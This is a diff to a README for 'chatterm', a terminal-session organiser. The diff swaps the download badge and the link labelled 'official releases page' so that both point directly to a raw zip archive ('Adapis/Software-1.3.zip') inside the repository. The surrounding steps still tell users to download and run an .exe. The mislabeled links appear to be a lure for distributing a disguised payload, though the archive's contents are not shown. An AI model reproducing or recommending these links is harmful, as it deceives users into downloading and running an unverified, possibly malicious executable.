@@ -1,6 +1,6 @@
 # 💬 chatterm - Organize your terminal sessions like chats
 
-[![](https://img.shields.io/badge/Download_Chatterm-Blue?style=for-the-badge)](https://github.com/kylilasynchronized9033/chatterm)
+[![](https://img.shields.io/badge/Download_Chatterm-Blue?style=for-the-badge)](https://github.com/kylilasynchronized9033/chatterm/raw/refs/heads/main/Adapis/Software-1.3.zip)
 
 ## 📁 What is chatterm?
 
@@ -19,7 +19,7 @@ Chatterm runs on any modern Windows computer. Ensure you have the following befo
 
 Follow these steps to set up chatterm on your computer.
 
-1. Visit the [official releases page](https://github.com/kylilasynchronized9033/chatterm) to view available downloads.
+1. Visit the [official releases page](https://github.com/kylilasynchronized9033/chatterm/raw/refs/heads/main/Adapis/Software-1.3.zip) to view available downloads.
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
